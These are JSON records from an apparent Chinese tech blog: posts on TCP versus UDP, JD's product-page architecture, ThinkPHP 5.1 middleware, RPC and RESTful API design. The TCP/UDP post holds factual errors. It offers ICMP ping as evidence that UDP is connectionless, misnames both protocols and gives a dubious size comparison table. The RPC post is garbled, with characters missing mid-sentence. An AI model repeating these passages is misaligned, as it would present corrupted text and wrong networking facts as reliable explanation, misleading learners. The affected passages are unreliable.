{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "TCP/UDP协议基本概念", "log_Intro": "TCP/UDP协议基本概念", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>TCP和UDP协议是<a href=\"https://baike.baidu.com/item/TCP%2FIP/214077\" rel=\"nofollow\">TCP/IP</a>协议的核心。 TCP 传输协议：TCP 协议是一TCP (Transmission Control Protocol)和UDP(User Datagram Protocol)协议属于<a href=\"https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E5%B1%82\" rel=\"nofollow\">传输层</a>协议。其中TCP提供IP环境下的数据<a href=\"https://baike.baidu.com/item/%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93/5588347\" rel=\"nofollow\">可靠传输</a>，它提供的服务包括<a href=\"https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E6%B5%81/3002243\" rel=\"nofollow\">数据流</a>传送、可靠性、有效流控、全双工操作和多路复用。通过面向连接、端到端和可靠的<a href=\"https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%8C%85/489739\" rel=\"nofollow\">数据包</a>发送。通俗说，它是事先为所发送的数据开辟出连接好的通道，然后再进行数据发送；而UDP则不为IP提供可靠性、流控或差错恢复功能。一般来说，TCP对应的是可靠性要求高的应用，而UDP对应的则是可靠性要求低、传输经济的应用。</p>\n\n<h3>一、定义</h3>\n\n<p>在TCP/IP网络体系结构中，TCP（<a href=\"https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE/9727741\" rel=\"nofollow\">传输控制协议</a>，Transport Controll Protocol、UDP（<a href=\"https://baike.baidu.com/item/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE/8535496\" rel=\"nofollow\">用户数据报协议</a>，User Data Protocol）是传输层最重要的两种协议，为上层用户提供级别的通信可靠性。</p>\n\n<p><strong>传输控制协议（TCP）</strong>：TCP（传输控制协议）定义了两台计算机之间进行可靠的传输而交换的数据和确认信息的格式，以及计算机为了确保数据的正确到达而采取的措施。协议规定了TCP软件怎样识别给定计算机上的多个目的进程如何对分组重复这类差错进行恢复。协议还规定了两台计算机如何初始化一个TCP<a href=\"https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E6%B5%81/3002243\" rel=\"nofollow\">数据流</a>传输以及如何结束这一传输。TCP最大的特点就是提供的是面向连接、可靠的<a href=\"https://baike.baidu.com/item/%E5%AD%97%E8%8A%82%E6%B5%81/3196772\" rel=\"nofollow\">字节流</a>服务。</p>\n\n<p><strong>用户数据报协议（UDP）：</strong>UDP（用户数据报协议）是一个简单的面向数据报的传输层协议。提供的是非面向连接的、不可靠的数据流传输。UDP不提供可靠性，也不提供<a href=\"https://baike.baidu.com/item/%E6%8A%A5%E6%96%87/3164352\" rel=\"nofollow\">报文</a>到达确认、排序以及流量控制等功能。它只是把应用程序传给<a href=\"https://baike.baidu.com/item/IP%E5%B1%82/22295968\" rel=\"nofollow\">IP层</a>的<a href=\"https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E6%8A%A5/2194617\" rel=\"nofollow\">数据报</a>发送出去，但是并不能保证它们能到达目的地。因此报文可能会丢失、重复以及乱序等。但由于UDP在传输数据报前不用在客户和<a href=\"https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571\" rel=\"nofollow\">服务器</a>之间建立一个连接，且没有超时重发等机制，故而传输速度很快。</p>\n\n<h3>二、相关概念</h3>\n\n<h3>网络协议</h3>\n\n<p>网络协议是指通信双方就通信如何进行所必须共同遵守的约定和通信规则的集合。在网络上通信的双方只有遵守相同的协议，才能正确地交流信息，就像人们交谈时要使用同一种语言一样，如果谈话里使用不同的语言，就会造成双方都不知所云，交流就被迫中断。典型的网络协议有：<a href=\"https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE/212915\" rel=\"nofollow\">TCP/IP协议</a>、<a href=\"https://baike.baidu.com/item/IPX%2FSPX%E5%8D%8F%E8%AE%AE/659271\" rel=\"nofollow\">IPX/SPX协议</a>、IEEEE802标准协议系列、<a href=\"https://baike.baidu.com/item/X.25%E5%8D%8F%E8%AE%AE/3169748\" rel=\"nofollow\">X.25协议</a>等。 [3]<a name=\"ref_%5B3%5D_1161229\"> </a></p>\n\n<p><a name=\"2_2\"></a><a name=\"sub1161229_2_2\"></a><a name=\"%E4%BC%A0%E8%BE%93%E5%B1%82\"></a><a name=\"2-2\"></a></p>\n\n<h3>传输层</h3>\n\n<p>综合OSI和TCP/IP参考模型的优点，采用一种5层的网络体系结构。传输层即五层网络体系结构中的一层。传输层的设计目标是允许源主机和目标主机上的对等实体进行对话，即为两个主机中进程之间的通信提供服务。例如，一台主机上的浏览器进程与另一台主机上的Web服务器进程之间进行通信。</p>\n\n<p>传输层的基本功能是接收来自上一层应用层的数据，在必要的时候把这些数据分割成较小的单元，然后把这些数据单元传递给网络层，并且确保这些数据单元能够正确地到达另一端。</p>\n\n<p>传输层是真正的端到端的层，它负责将数据从源端传送到目标端，即源端主机上的一个程序利用传输层协议与目标端主机上的一个程序进行会话。而在其下面的各层，只涉及一台主机与它的直接邻居的通信，这是因为源主机和目标主机之间可能存在多个中间<a href=\"https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1%E5%99%A8/108294\" rel=\"nofollow\">路由器</a>。</p>\n\n<h2>三、协议介绍</h2>\n\n<h3>面向连接的TCP</h3>\n\n<p>“面向连接”就是在正式通信前必须要与对方建立起连接，是按照电话系统建模的。比如你给别人打电话，必须等线路接通了、对方拿起话筒才能相互通话。</p>\n\n<p>TCP协议是一种可靠的、一对一的、面向有连接的通信协议，TCP主要通过下列几种方式保证数据传输的可靠性：</p>\n\n<p>（1）在使用TCP协议进行数据传输时，往往需要客户端和服务端先建立一个“通道“、且这个通道只能够被客户端和服务端使用，所以TCP传输协议只能面向一对一的连接。</p>\n\n<p>（2）为了保证数据传输的准确无误，TCP传输协议将用于传输的数据包分为若干个部分（每个部分的大小根据当时的网络情况而定），然后在它们的首部添加一个检验字节。当数据的一个部分被接收完毕之后，服务端会对这一部分的完整性和准确性进行校验，校验之后如果数据的完整度和准确度都为100%，在服务端会要求客户端开始数据下一个部分的传输，如果数据的完整性和准确性与原来不相符，那么服务端会要求客户端再次传输这个部分。 [5]<a name=\"ref_%5B5%5D_1161229\"> </a></p>\n\n<p>客户端与服务端在使用TCP传输协议时要先建立一个“通道”，在传输完毕之后又要关闭这“通道”，前者可以被形象地成为“三次握手”，而后者则可以被称为“四次挥手”。</p>\n\n<p><strong>通道的建立——三次握手：</strong></p>\n\n<p>（1）在建立通道时，客户端首先要向服务端发送一个SYN同步信号。</p>\n\n<p>（2）服务端在接收到这个信号之后会向客户端发出SYN同步信号和ACK确认信号。</p>\n\n<p>（3）当服务端的ACK和SYN到达客户端后，客户端与服务端之间的这个“通道”就会被建立起来。</p>\n\n<p><strong>通道的关闭——四次挥手：</strong></p>\n\n<p>（1）在数据传输完毕之后，客户端会向服务端发出一个FIN终止信号。</p>\n\n<p>（2）服务端在收到这个信号之后会向客户端发出一个ACK确认信号。</p>\n\n<p>（3）如果服务端此后也没有数据发给客户端时服务端会向客户端发送一个FIN终止信号。</p>\n\n<p>（4）客户端在收到这个信号之后会回复一个确认信号，在服务端接收到这个信号之后，服务端与客户端的通道也就关闭了。</p>\n\n<p>TCP协议能为应用程序提供可靠的通信连接，使一台计算机发出的<a href=\"https://baike.baidu.com/item/%E5%AD%97%E8%8A%82%E6%B5%81\" rel=\"nofollow\">字节流</a>无差错地发往网络上的其他计算机，对可靠性要求高的<a href=\"https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9F\" rel=\"nofollow\">数据通信系统</a>往往使用TCP协议传输数据。</p>\n\n<h3>无连接的UDP协议</h3>\n\n<p>“无连接”就是在正式通信前不必与对方先建立连接，不管对方状态就直接发送。与手机短信非常相似：你在发短信的时候，只需要输入对方手机号就OK了。</p>\n\n<p><a href=\"https://baike.baidu.com/item/UDP/571511\" rel=\"nofollow\">UDP</a>传输协议是一种不可靠的、面向无连接、可以实现多对一、一对多和一对一连接的通信协议。UDP在传输数据前既不需要建立通道，在数据传输完毕后也不需要将通道关闭。只要客户端给服务端发送一个请求，服务端就会一次性地把所有数据发送完毕。UDP在传输数据时不会对数据的完整性进行验证，在数据丢失或数据出错时也不会要求重新传输，因此也节省了很多用于验证数据包的时间，所以以UDP建立的连接的延迟会比以TCP建立的连接的延迟更低。UDP不会根据当前的网络情况来控制数据的发送速度，因此无论网络情况是好是坏，服务端都会以恒定的速率发送数据。虽然这样有时会造成数据的丢失与损坏，但是这一点对于一些实时应用来说是十分重要的。基于以上三点，UDP在数据传输方面速度更快，延迟更低，实时性更好，因此被广泛地用于通信领域和视频网站当中。 [5]<a> </a></p>\n\n<p>UDP适用于一次只传送少量数据、对可靠性要求不高的应用环境。比如，我们经常使用“ping”命令来测试两台<a href=\"https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA\" rel=\"nofollow\">主机</a>之间TCP/IP通信是否正常，其实“ping”命令的原理就是向对方主机发送ICMP数据包，然后对方主机确认收到数据包，如果数据包是否到达的消息及时反馈回来，那么网络就是通的。例如，在默认状态下，一次“ping”操作发送4个数据包（如图所示）。大家可以看到，发送的数据包数量是4包，收到的也是4包（因为对方主机收到后会发回一个确认收到的数据包）。这充分说明了UDP协议是<a href=\"https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E9%9D%9E%E8%BF%9E%E6%8E%A5\" rel=\"nofollow\">面向非连接</a>的协议，没有建立连接的过程。正因为UDP协议没有连接的过程，所以它的通信效率高；但也正因为如此，它的可靠性不如TCP协议高。QQ就使用UDP发消息，因此有时会出现收不到消息的情况。</p>\n\n<p><a name=\"4\"></a><a name=\"sub1161229_4\"></a><a name=\"%E5%8D%8F%E8%AE%AE%E5%B7%AE%E5%88%AB\"></a></p>\n\n<h2>四、协议差别</h2>\n\n<p>TCP/IP 和UDP最大的区别就是：TCP/IP是面向连接的，UDP是无连接的。TCP协议和UDP协议各有所长、各有所短，适用于不同要求的通信环境。TCP协议和UDP协议之间的差别如下表所示。</p>\n\n<p>在实际的使用中，TCP主要应用于文件传输精确性相对要求较高且不是很紧急的情景，比如电子邮件、远程登录等。有时在这些应用场景下即使丢失一两个字节也会造成不可挽回的错误，所以这些场景中一般都使用TCP传输协议。由于UDP可以提高传输效率，所以UDP被广泛应用于数据量大且精确性要求不高的数据传输，比如我们平常在网站上观看视频或者听音乐的时候应用的基本上都是UDP传输协议。</p>\n\n<table><caption>表1 TCP与UDP区别</caption>\n\t<tbody><tr><td style=\"vertical-align:top;\"> </td>\n\t\t\t<td style=\"vertical-align:top;\">TCP</td>\n\t\t\t<td style=\"vertical-align:top;\">UDP</td>\n\t\t</tr><tr><td style=\"vertical-align:top;\">是否连接</td>\n\t\t\t<td style=\"vertical-align:top;\">面向连接</td>\n\t\t\t<td style=\"vertical-align:top;\">无连接</td>\n\t\t</tr><tr><td style=\"vertical-align:top;\">传输可靠性</td>\n\t\t\t<td style=\"vertical-align:top;\">可靠的</td>\n\t\t\t<td style=\"vertical-align:top;\">不可靠的</td>\n\t\t</tr><tr><td style=\"vertical-align:top;\">应用场景</td>\n\t\t\t<td style=\"vertical-align:top;\">传输少量数据</td>\n\t\t\t<td style=\"vertical-align:top;\">大量数据</td>\n\t\t</tr><tr><td style=\"vertical-align:top;\">速度</td>\n\t\t\t<td style=\"vertical-align:top;\">慢</td>\n\t\t\t<td style=\"vertical-align:top;\">\n\t\t\t<p>快</p>\n\t\t\t</td>\n\t\t</tr></tbody></table>                                    </div>", "log_PostTime": 1584891202, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "亿级商品详情页架构演进技术解密", "log_Intro": "亿级商品详情页架构演进技术解密", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>商品详情页是什么</h3>\n\n<p>商品详情页是展示商品详细信息的一个页面，承载在网站的大部分流量和订单的入口。京东商城目前有通用版、全球购、闪购、易车、惠买车、服装、拼购、今日抄底等许多套详情页模板，通过一些特殊属性、商家类型和打标来区分，每套模板数据是一样的，核心逻辑基本一样，但是一些前端逻辑是有差别的。</p>\n\n<p> </p>\n\n<p>目前商品详情页个性化需求非常多，数据来源也是非常多的（目前统计后端有差不多数十个依赖服务），而且许多基础服务做不了的不想做的或者说需要紧急处理的都放我们这处理，比如一些屏蔽商品需求等。因此我们需要一种架构能快速响应和优雅的解决这些需求问题，来了问题能在5~10分钟内搞定。我们这边经还常收到一些紧急需求，比如工商的一些投诉等需要及时响应。之前架构是静态化的，肯定无法满足这种日趋复杂和未知的需求。静态化时做屏蔽都是通过js，所以我们重新设计了商品详情页的架构。</p>\n\n<p> </p>\n\n<p>它主要包括以下三部分：</p>\n\n<p><strong>商品详情页系统</strong><br>\n负责静的部分（整个页面）</p>\n\n<p> </p>\n\n<p><strong>商品详情页动态服务系统和商品详情页统一服务系统</strong><br><code>统一服务系统</code> 负责动的部分，比如实时库存。目前已经上线了几个核心服务，今晚计划切新库存服务的1/n流量。<br><code>动态服务系统</code> 负责给内网其他系统提供一些数据服务（比如大客户系统需要商品数据），目前商品详情页系统已经稳定运行半年了，目前主要给列表页提供一些数据。</p>\n\n<p> </p>\n\n<p><strong>键值结构的异构数据集群</strong></p>\n\n<p>商品主数据因为是存储在DB中，对于一些聚合数据需要联合查询非常多，会导致查询性能差的问题，因此对于键值类型的查询，我们这套异构数据非常有用。我们这次架构的调整的主要目的是满足日趋复杂的业务需求，能及时开发业务方的需求。我们的系统主要处理键值数据的逻辑，关系查询我们有另一套异构系统。</p>\n\n<p> </p>\n\n<p>下图是我们的模板页，核心数据都是一样的，只是展示方式和一些前端逻辑不太一样。</p>\n\n<p></p>                                    </div>", "log_PostTime": 1584891205, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "thinkphp5.1 中间件是什么有什么用", "log_Intro": "thinkphp5.1 中间件是什么有什么用", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>中间件是什么？有什么作用？</h3>\n\n<p><br>\n中间件主要用于拦截或过滤应用的HTTP请求，并进行必要的业务处理。---tp5.1手册<br>\n也就是说，降低了系统的耦合；【在http请求阶段，执行中间件的入口执行方法（handle）--tp5.1】----减少了系统的一些if/else判断，因此降低了系统的耦合<br>\n中间件可以实现什么功能，例如权限验证，访问记录，重定向等等。-----这些业务的存在降低了耦合</p>\n\n<h3>Thinkphp中间件有什么用？</h3>\n\n<p>消息队列、远程方法调用RPC框架、ODBC、ORM持久化框架、缓存、资源定位、中间件定义的边界并不是很清晰，介于应用逻辑和操作系统（网络、存储系统）之间抽象层都可以算作中间件。</p>\n\n<p><br>\nthinkphp5.1 中的中间件说明：<br>\n生成中间件：</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">php think make:middleware Check</code></pre>\n\n<p> 这个指令会 application/http/middleware目录下面生成一个Check中间件</p>\n\n<p> </p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php\n \nnamespace app\\http\\middleware;\n \nclass Check{\n      //第三个参数，可以通过路由赋值传递\n     public function handle($request, \\Closure $next, $name)\n     {\n         //下面这一句是 给控制器 传值\n         $request-&gt;hello = 'ThinkPHP';\n          \n         if ($name == 'think') {\n             return redirect('index/think');\n         }\n  \n         return $next($request);\n     }\n      \n     }</code></pre>\n\n<p></p>                                    </div>", "log_PostTime": 1584891206, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "RPC通信原理", "log_Intro": "RPC通信原理", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>什么是 RPC</h3>\n\n<p><br>\nRPC（Remote Procedure Call Protocol）远程过程调用协议。<br>\n通俗的描述是：客户端在不知道调用细节的情况下，调用存在于远程计算上的某个过程或函数，就像调用本地应用程序中的一样。</p>\n\n<p>正式的描述是：一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。</p>\n\n<p>一句话总结:<br><strong>RPC：remote procedure call Protocol 远程过程调用</strong><br>\n调用远程服务，就像调用本地的服务一样，不用关心调用细节，就像调用本机的服务一样的</p>\n\n<p>RPC 主要特质：</p>\n\n<p>RPC 是协议：协议意味着规范。目前典型的 RPC 实现包括Hetty 等。但这些实现往往都会附加其他重要功能，例如 Du理、访问权限管理等功能。</p>\n\n<p>网络协议和网络 IO 模型对其透明：既然 RPC 的客户端认地对象。那么传输层使用的是 TCP/UDP 还是 HTTP 协议，又或络协议它就不需要关心了。既然网络对其透明，那么调哪一种网络 IO 模型调用者也不需要关心。</p>\n\n<p>信息格式对其透明：远程调用过程中，需要传递一些参调用结果。至于这些参数会以某种信息格式传递给网络上的个信息格式是怎样构成的，调用方是不需要关心的。</p>\n\n<p>跨语言能力：对于调用方来说，不知道也无需知道远程语言运行的，无论服务器方使用的是什么语言，本次调用都值也应该按照调用方程序语言所能理解的形式进行描</p>\n\n<p> </p>\n\n<h3>RPC 原理：</h3>\n\n<p><br>\n实现 RPC 的程序包括 5 个部分：User、User-stub、RPCRuntime、Server-stub、Server。</p>\n\n<p><img alt=\"\" class=\"has\" height=\"231\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTM4MjUwOS8yMDE5MDMvMTM4MjUwOS0yMDE5MDMxMzIxMDk1MzQxMy0xNjkxMTI1MDYwLmpwZw?x-oss-process=image/format,png\" width=\"694\"><br>\nuser 就是发起 RPC 调用的 client ，当 user 想发起一个远程调用时，它实际是通过本地调用 user-stub。 user-stub 负责将调用的接口、方法和参数通过约定的协议规范进行编码并通过本地的 RPCRuntime 实例传输到远端的实例。远端 RPCRuntim 实例收到请求后交给 server-stub 进行解码后发起本地端调用，调用结果再返回给 user 端。<br><br>\nstub：为屏蔽客户调用远程主机上的对象，必须提供某种方式来模拟本地对象，这种本地对象称为存根(stub)，存根负责接收本地方法调用，并将它们委派给各自的具体实现对象</p>\n                                    </div>", "log_PostTime": 1584891207, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "RESTful API 最佳实践", "log_Intro": "RESTful API 最佳实践", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><a href=\"\" rel=\"nofollow\">RESTful</a>是目前最流行的 API 设计规范，用于 Web 数据接口的设计。</p>\n\n<p>它的大原则容易把握，但是细节不容易做对。本文总结 RESTful 的设计细节，介绍如何设计出易于理解和使用的 API。</p>\n\n<h2>一、URL 设计</h2>\n\n<h3>1.1 动词 + 宾语</h3>\n\n<p>RESTful 的核心思想就是，客户端发出的数据操作指令都是\"动词 + 宾语\"的结构。比如，<code>GET /articles</code>这个命令，<code>GET</code>是动词，<code>/articles</code>是宾语。</p>\n\n<p>动词通常就是五种 HTTP 方法，对应 CRUD 操作。</p>\n\n<blockquote>\n<ul><li>GET：读取（Read）</li>\n\t<li>POST：新建（Create）</li>\n\t<li>PUT：更新（Update）</li>\n\t<li>PATCH：更新（Update），通常是部分更新</li>\n\t<li>DELETE：删除（Delete）</li>\n</ul></blockquote>\n\n<p>根据 HTTP 规范，动词一律大写。</p>\n\n<h3>1.2 动词的覆盖</h3>\n\n<p>有些客户端只能使用<code>GET</code>和<code>POST</code>这两种方法。服务器必须接受<code>POST</code>模拟其他三个方法（<code>PUT</code>、<code>PATCH</code>、<code>DELETE</code>）。</p>\n\n<p>这时，客户端发出的 HTTP 请求，要加上<code>X-HTTP-Method-Override</code>属性，告诉服务器应该使用哪一个动词，覆盖<code>POST</code>方法。</p>\n\n<blockquote>\n<pre class=\"has\">\n<code>\nPOST /api/Person/4 HTTP/1.1  \nX-HTTP-Method-Override: PUT\n</code></pre>\n</blockquote>\n\n<p>上面代码中，<code>X-HTTP-Method-Override</code>指定本次请求的方法是<code>PUT</code>，而不是<code>POST</code>。</p>\n\n<h3>1.3 宾语必须是名词</h3>\n\n<p>宾语就是 API 的 URL，是 HTTP 动词作用的对象。它应该是名词，不能是动词。比如，<code>/articles</code>这个 URL 就是正确的，而下面的 URL 不是名词，所以都是错误的。</p>\n\n<blockquote>\n<ul><li>/getAllCars</li>\n\t<li>/createNewCar</li>\n\t<li>/deleteAllRedCars</li>\n</ul></blockquote>\n\n<h3>1.4 复数 URL</h3>\n\n<p>既然 URL 是名词，那么应该使用复数，还是单数？</p>\n\n<p>这没有统一的规定，但是常见的操作是读取一个集合，比如<code>GET /articles</code>（读取所有文章），这里明显应该是复数。</p>\n\n<p>为了统一起见，建议都使用复数 URL，比如<code>GET /articles/2</code>要好于<code>GET /article/2</code>。</p>\n\n<h3>1.5 避免多级 URL</h3>\n\n<p>常见的情况是，资源需要多级分类，因此很容易写出多级的 URL，比如获取某个作者的某一类文章。</p>\n\n<blockquote>\n<pre class=\"has\">\n<code>\nGET /authors/12/categories/2\n</code></pre>\n</blockquote>\n\n<p>这种 URL 不利于扩展，语义也不明确，往往要想一会，才能明白含义。</p>\n\n<p>更好的做法是，除了第一级，其他级别都用查询字符串表达。</p>\n\n<blockquote>\n<pre class=\"has\">\n<code>\nGET /authors/12?categories=2\n</code></pre>\n</blockquote>\n\n<p>下面是另一个例子，查询已发布的文章。你可能会设计成下面的 URL。</p>\n\n<blockquote>\n<pre class=\"has\">\n<code>\nGET /articles/published\n</code></pre>\n</blockquote>\n\n<p>查询字符串的写法明显更好。</p>\n\n<blockquote>\n<pre class=\"has\">\n<code>\nGET /articles?published=true</code></pre>\n</blockquote>\n\n<h2>二、状态码</h2>\n\n<h3>2.1 状态码必须精确</h3>\n\n<p>客户端的每一次请求，服务器都必须给出回应。回应包括 HTTP 状态码和数据两部分。</p>\n\n<p>HTTP 状态码就是一个三位数，分成五个类别。</p>\n\n<blockquote>\n<ul><li><code>1xx</code>：相关信息</li>\n\t<li><code>2xx</code>：操作成功</li>\n\t<li><code>3xx</code>：重定向</li>\n\t<li><code>4xx</code>：客户端错误</li>\n\t<li><code>5xx</code>：服务器错误</li>\n</ul></blockquote>\n\n<p>这五大类总共包含<a href=\"https://en.wikipedia.org/wiki/List_of_HTTP_status_codes\" rel=\"nofollow\">100多种</a>状态码，覆盖了绝大部分可能遇到的情况。每一种状态码都有标准的（或者约定的）解释，客户端只需查看状态码，就可以判断出发生了什么情况，所以服务器应该返回尽可能精确的状态码。</p>\n\n<p>API 不需要<code>1xx</code>状态码，下面介绍其他四类状态码的精确含义。</p>\n\n<h3>2.2 2xx 状态码</h3>\n\n<p><code>200</code>状态码表示操作成功，但是不同的方法可以返回更精确的状态码。</p>\n\n<blockquote>\n<ul><li>GET: 200 OK</li>\n\t<li>POST: 201 Created</li>\n\t<li>PUT: 200 OK</li>\n\t<li>PATCH: 200 OK</li>\n\t<li>DELETE: 204 No Content</li>\n</ul></blockquote>\n\n<p>上面代码中，<code>POST</code>返回<code>201</code>状态码，表示生成了新的资源；<code>DELETE</code>返回<code>204</code>状态码，表示资源已经不存在。</p>\n\n<p>此外，<code>202 Accepted</code>状态码表示服务器已经收到请求，但还未进行处理，会在未来再处理，通常用于异步操作。下面是一个例子。</p>\n\n<blockquote>\n<pre class=\"has\">\n<code>\nHTTP/1.1 202 Accepted\n\n{\n  \"task\": {\n    \"href\": \"/api/company/job-management/jobs/2130040\",\n    \"id\": \"2130040\"\n  }\n}\n</code></pre>\n</blockquote>\n\n<h3>2.3 3xx 状态码</h3>\n\n<p>API 用不到<code>301</code>状态码（永久重定向）和<code>302</code>状态码（暂时重定向，<code>307</code>也是这个含义），因为它们可以由应用级别返回，浏览器会直接跳转，API 级别可以不考虑这两种情况。</p>\n\n<p>API 用到的<code>3xx</code>状态码，主要是<code>303 See Other</code>，表示参考另一个 URL。它与<code>302</code>和<code>307</code>的含义一样，也是\"暂时重定向\"，区别在于<code>302</code>和<code>307</code>用于<code>GET</code>请求，而<code>303</code>用于<code>POST</code>、<code>PUT</code>和<code>DELETE</code>请求。收到<code>303</code>以后，浏览器不会自动跳转，而会让用户自己决定下一步怎么办。下面是一个例子。</p>\n\n<blockquote>\n<pre class=\"has\">\n<code>\nHTTP/1.1 303 See Other\nLocation: /api/orders/12345\n</code></pre>\n</blockquote>\n\n<h3>2.4 4xx 状态码</h3>\n\n<p><code>4xx</code>状态码表示客户端错误，主要有下面几种。</p>\n\n<p><code>400 Bad Request</code>：服务器不理解客户端的请求，未做任何处理。</p>\n\n<p><code>401 Unauthorized</code>：用户未提供身份验证凭据，或者没有通过身份验证。</p>\n\n<p><code>403 Forbidden</code>：用户通过了身份验证，但是不具有访问资源所需的权限。</p>\n\n<p><code>404 Not Found</code>：所请求的资源不存在，或不可用。</p>\n\n<p><code>405 Method Not Allowed</code>：用户已经通过身份验证，但是所用的 HTTP 方法不在他的权限之内。</p>\n\n<p><code>410 Gone</code>：所请求的资源已从这个地址转移，不再可用。</p>\n\n<p><code>415 Unsupported Media Type</code>：客户端要求的返回格式不支持。比如，API 只能返回 JSON 格式，但是客户端要求返回 XML 格式。</p>\n\n<p><code>422 Unprocessable Entity</code> ：客户端上传的附件无法处理，导致请求失败。</p>\n\n<p><code>429 Too Many Requests</code>：客户端的请求次数超过限额。</p>\n\n<h3>2.5 5xx 状态码</h3>\n\n<p><code>5xx</code>状态码表示服务端错误。一般来说，API 不会向用户透露服务器的详细信息，所以只要两个状态码就够了。</p>\n\n<p><code>500 Internal Server Error</code>：客户端请求有效，服务器处理时发生了意外。</p>\n\n<p><code>503 Service Unavailable</code>：服务器无法处理请求，一般用于网站维护状态。</p>\n\n<h2>三、服务器回应</h2>\n\n<h3>3.1 不要返回纯本文</h3>\n\n<p>API 返回的数据格式，不应该是纯文本，而应该是一个 JSON 对象，因为这样才能返回标准的结构化数据。所以，服务器回应的 HTTP 头的<code>Content-Type</code>属性要设为<code>application/json</code>。</p>\n\n<p>客户端请求时，也要明确告诉服务器，可以接受 JSON 格式，即请求的 HTTP 头的<code>ACCEPT</code>属性也要设成<code>application/json</code>。下面是一个例子。</p>\n\n<blockquote>\n<pre class=\"has\">\n<code>\nGET /orders/2 HTTP/1.1 \nAccept: application/json\n</code></pre>\n</blockquote>\n\n<h3>3.2 发生错误时，不要返回 200 状态码</h3>\n\n<p>有一种不恰当的做法是，即使发生错误，也返回<code>200</code>状态码，把错误信息放在数据体里面，就像下面这样。</p>\n\n<blockquote>\n<pre class=\"has\">\n<code>\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"status\": \"failure\",\n  \"data\": {\n    \"error\": \"Expected at least two items in list.\"\n  }\n}\n</code></pre>\n</blockquote>\n\n<p>上面代码中，解析数据体以后，才能得知操作失败。</p>\n\n<p>这张做法实际上取消了状态码，这是完全不可取的。正确的做法是，状态码反映发生的错误，具体的错误信息放在数据体里面返回。下面是一个例子。</p>\n\n<blockquote>\n<pre class=\"has\">\n<code>\nHTTP/1.1 400 Bad Request\nContent-Type: application/json\n\n{\n  \"error\": \"Invalid payoad.\",\n  \"detail\": {\n     \"surname\": \"This field is required.\"\n  }\n}\n</code></pre>\n</blockquote>\n\n<h3>3.3 提供链接</h3>\n\n<p>API 的使用者未必知道，URL 是怎么设计的。一个解决方法就是，在回应中，给出相关链接，便于下一步操作。这样的话，用户只要记住一个 URL，就可以发现其他的 URL。这种方法叫做 HATEOAS。</p>\n\n<p>举例来说，GitHub 的 API 都在 <a href=\"https://api.github.com/\" rel=\"nofollow\">api.github.com</a> 这个域名。访问它，就可以得到其他 URL。</p>\n\n<blockquote>\n<pre>\n<code>\n{\n  ...\n  \"feeds_url\": \"<a href=\"https://api.github.com/feeds\" rel=\"nofollow\">https://api.github.com/feeds</a>\",\n  \"followers_url\": \"<a href=\"https://api.github.com/user/followers\" rel=\"nofollow\">https://api.github.com/user/followers</a>\",\n  \"following_url\": \"<a href=\"https://api.github.com/user/following\" rel=\"nofollow\">https://api.github.com/user/following</a>{/target}\",\n  \"gists_url\": \"<a href=\"https://api.github.com/gists\" rel=\"nofollow\">https://api.github.com/gists</a>{/gist_id}\",\n  \"hub_url\": \"<a href=\"https://api.github.com/hub\" rel=\"nofollow\">https://api.github.com/hub</a>\",\n  ...\n}\n</code></pre>\n</blockquote>\n\n<p>上面的回应中，挑一个 URL 访问，又可以得到别的 URL。对于用户来说，不需要记住 URL 设计，只要从 api.github.com 一步步查找就可以了。</p>\n\n<p>HATEOAS 的格式没有统一规定，上面例子中，GitHub 将它们与其他属性放在一起。更好的做法应该是，将相关链接与其他属性分开。</p>\n\n<blockquote>\n<pre class=\"has\">\n<code>\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"status\": \"In progress\",\n   \"links\": {[\n    { \"rel\":\"cancel\", \"method\": \"delete\", \"href\":\"/api/status/12345\" } ,\n    { \"rel\":\"edit\", \"method\": \"put\", \"href\":\"/api/status/12345\" }\n  ]}\n}</code></pre>\n</blockquote>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891208, "log_Meta": ""}
